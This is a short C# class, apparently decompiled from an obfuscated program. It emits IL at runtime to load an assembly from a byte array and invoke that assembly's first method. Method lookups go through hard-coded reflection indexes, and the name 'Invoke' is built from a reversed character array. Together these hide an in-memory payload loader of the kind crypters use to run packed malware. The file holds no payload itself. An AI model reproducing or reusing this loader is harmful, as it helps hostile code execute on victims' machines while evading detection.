using System;
using System.Reflection;
using System.Reflection.Emit;

public class GClass3
{
	public delegate void I(byte[] input);

	private static char[] char_0 = new char[5] { 'E', 'K', 'O', 'V', 'N' };

	private static OpCode[] opCode_0 = new OpCode[10]
	{
		OpCodes.Nop,
		OpCodes.Ldarg_0,
		OpCodes.Call,
		OpCodes.Callvirt,
		OpCodes.Ldelem_Ref,
		OpCodes.Ldnull,
		OpCodes.Ldc_I4_0,
		OpCodes.Newarr,
		OpCodes.Pop,
		OpCodes.Ret
	};

	private static MethodInfo[] methodInfo_0 = new MethodInfo[4]
	{
		typeof(Assembly).GetMethods()[39],
		typeof(Assembly).GetMethods()[16],
		typeof(Type).GetMethods()[50],
		typeof(MethodBase).GetMethod("Invoke", new Type[2]
		{
			typeof(object),
			typeof(object[])
		})
	};

	private static Type[] type_0 = new Type[3]
	{
		typeof(void),
		typeof(byte[]),
		typeof(object)
	};

	public GClass3()
	{
		Array.Reverse((Array)char_0);
		methodInfo_0 = new MethodInfo[4]
		{
			typeof(Assembly).GetMethods()[39],
			typeof(Assembly).GetMethods()[16],
			typeof(Type).GetMethods()[50],
			typeof(MethodBase).GetMethod("I" + new string(char_0).ToLower(), new Type[2]
			{
				typeof(object),
				typeof(object[])
			})
		};
	}

	public static void smethod_0(ref I i_0)
	{
		DynamicMethod dynamicMethod = new DynamicMethod("", type_0[0], new Type[1] { type_0[1] }, restrictedSkipVisibility: true);
		ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
		iLGenerator.Emit(opCode_0[0]);
		iLGenerator.Emit(opCode_0[1]);
		iLGenerator.Emit(opCode_0[2], methodInfo_0[0]);
		iLGenerator.Emit(opCode_0[3], methodInfo_0[1]);
		iLGenerator.Emit(opCode_0[6]);
		iLGenerator.Emit(opCode_0[4]);
		iLGenerator.Emit(opCode_0[3], methodInfo_0[2]);
		iLGenerator.Emit(opCode_0[6]);
		iLGenerator.Emit(opCode_0[4]);
		iLGenerator.Emit(opCode_0[5]);
		iLGenerator.Emit(opCode_0[6]);
		iLGenerator.Emit(opCode_0[7], type_0[2]);
		iLGenerator.Emit(opCode_0[3], methodInfo_0[3]);
		iLGenerator.Emit(opCode_0[8]);
		iLGenerator.Emit(opCode_0[0]);
		iLGenerator.Emit(opCode_0[9]);
		i_0 = (I)dynamicMethod.CreateDelegate(typeof(I));
	}
}
